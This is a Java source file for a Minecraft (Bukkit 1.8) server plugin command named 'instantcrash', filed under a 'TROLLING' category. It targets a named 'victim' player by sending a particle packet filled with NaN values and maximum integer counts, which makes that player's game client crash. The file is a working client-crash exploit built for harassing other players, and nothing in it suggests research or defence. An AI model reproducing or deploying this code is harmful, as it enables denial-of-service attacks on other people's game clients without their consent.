package de.garkolym.cp.commands.impl;

import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class Command_InstantCrash extends CommandBase {

    public Command_InstantCrash() {
        super("instantcrash", "<Spieler>", Category.TROLLING);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player victim = Bukkit.getPlayer(args[1]);
                ((CraftPlayer) victim).getHandle().playerConnection.sendPacket(new PacketPlayOutWorldParticles(EnumParticle.PORTAL, true, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Integer.MAX_VALUE, Integer.MAX_VALUE));
            } catch (Exception ignored) {
            }
        }
    }

}
